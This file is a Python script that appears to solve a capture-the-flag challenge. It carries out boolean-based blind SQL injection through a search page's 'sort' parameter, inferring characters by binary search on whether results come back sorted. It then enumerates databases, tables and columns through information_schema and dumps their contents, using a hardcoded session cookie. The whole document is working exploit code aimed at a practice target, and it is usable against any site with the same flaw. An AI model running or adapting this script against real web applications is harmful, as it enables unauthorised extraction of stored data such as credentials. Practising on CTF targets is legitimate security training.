import requests
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import pandas as pd

base_url = 'http://ctf2.segfaulthub.com:7777/sqli_8/notice_list.php'
headers = {'User-Agent': generate_user_agent(os='win', device_type='desktop')}
# 쿠키 설정
cookies = {
    'PHPSESSID': 'to5q69jkf61ejgcpk2ev1gvh90'
}

# POST 요청을 위한 데이터 설정
data = {
    "option_val": "title",
    "board_result": "",
    "board_search": "%F0%9F%94%8D",  # 이모지 또는 검색어
    "date_from": "",
    "date_to": "",
    "sort": ""
}



def fetch_data(query, limit, len):
    results = []
    for index in range(limit):
        target_len=1
        guessed_word = ""
        while target_len<len:
            low = 33
            high = 126
            while low <= high:  # 33부터 126까지
                x = int((low + high) / 2)
                data['sort'] = f"case when  (ascii(substr(({query} limit {index},1),{target_len},1)) > {x}) then title else username end"
                response = requests.post(base_url, headers=headers, cookies=cookies, data=data)
                soup = BeautifulSoup(response.text, "html.parser")

                try:
                    result = [link.text for link in soup.find_all('a')] == sorted([link.text for link in soup.find_all('a')])
                    if result:
                        low = x + 1
                    else:
                        high = x - 1
                except AttributeError:
                    break
            data['sort'] = f"case when (ascii(substr(({query} limit {index},1),{target_len},1)) = {x}) then title else username end"
            response = requests.post(base_url, headers=headers, cookies=cookies, data=data)
            soup = BeautifulSoup(response.text, "html.parser")
        
            try:
                result = [link.text for link in soup.find_all('a')] == sorted([link.text for link in soup.find_all('a')])
                if result:
                    guessed_char = chr(x)
                    guessed_word += guessed_char
                else:
                    data['sort'] = f"case when (ascii(substr(({query} limit {index},1),{target_len},1)) = {x+1}) then title else username end"
                    response = requests.post(base_url, headers=headers, cookies=cookies, data=data)
                    soup = BeautifulSoup(response.text, "html.parser")

                    result = [link.text for link in soup.find_all('a')] == sorted([link.text for link in soup.find_all('a')])
                    if result:
                        guessed_char = chr(x+1)
                    else:
                        guessed_char = chr(x-1)

                    guessed_word += guessed_char
            except AttributeError:
                break
            target_len += 1

        guessed_word = guessed_word.strip().replace(" ", "")
        results.append(guessed_word)
    return results

def fetch_schemas():
    query = "select database()"
    return fetch_data(query, 10, 15)

def fetch_tables(db_name):
    query = f"select table_name from information_schema.tables where table_schema='{db_name}'"
    return fetch_data(query, 10, 15)

def fetch_columns(table_name, db_name):
    query = f"select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{db_name}'"
    return fetch_data(query, 10, 15)

def fetch_data_from_column(column_name, table_name, db_name):
    query = f"select {column_name} from {db_name}.{table_name}"
    return fetch_data(query, 10, 31)

def fetch_all_data():
    # 모든 스키마, 테이블, 컬럼 데이터를 저장할 리스트
    all_data = []

    schemas = fetch_schemas()

    if schemas:
        for schema in schemas:
            if schema:  # 비어있지 않은 스키마에 대해 처리
                print(f"\nSchema: {schema}")
                tables = fetch_tables(schema)
                if len(tables) > 0:  
                    print(f"{schema}:", tables)
                for table in tables:
                    if table:  # 비어있지 않은 테이블에 대해 처리
                        columns = fetch_columns(table, schema)
                        print(f"{table}:", columns)
                        for column in columns:
                            if column:  # 비어있지 않은 컬럼에 대해 처리
                                data = fetch_data_from_column(column, table, schema)
                                print(f"{column}:", data)
                                if data:  # 빈 데이터 제외
                                    # 데이터를 리스트로 저장
                                    for value in data:
                                        all_data.append({
                                            'Schema': schema.strip(),
                                            'Table': table.strip(),
                                            'Column': column.strip(),
                                            'Value': value.strip()
                                        })
    
    return all_data

if __name__ == "__main__":
    all_data = fetch_all_data()
    #print("\nAll Data:", all_data)